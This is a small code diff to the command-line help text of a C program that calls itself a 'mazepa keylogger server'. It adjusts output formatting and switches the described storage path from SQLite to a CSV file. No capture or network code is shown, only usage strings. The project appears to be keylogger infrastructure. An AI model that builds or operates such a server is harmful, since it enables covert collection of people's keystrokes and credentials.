@@ -15,13 +15,14 @@ const static struct option cli_options[] = {
 };
 
 static void get_help(const char *bin_name) {
-  printf("%s: mazepa keylogger server\n", bin_name);
+  printf("%s: mazepa keylogger server\n\n", bin_name);
   printf("USAGE:\n");
   printf("\t--listen-port [-p]: specifies server listening port\n");
-  printf("\t--db-path     [-d]: specifies sqlite .db filepath\n");
+  // TODO: use sqlite instead? cbf to be honest, but could be a good exercise
+  printf("\t--db-path     [-d]: specifies .csv filepath\n");
 
   printf("\t--help        [-h]: triggers help mode\n");
-  printf("\n\nwritten with <3 by djnn -- https://djnn.sh");
+  printf("\n\nwritten with <3 by djnn -- https://djnn.sh\n");
 }
 
 int parse_cli_arguments(server_t *instance, int ac, char **av,
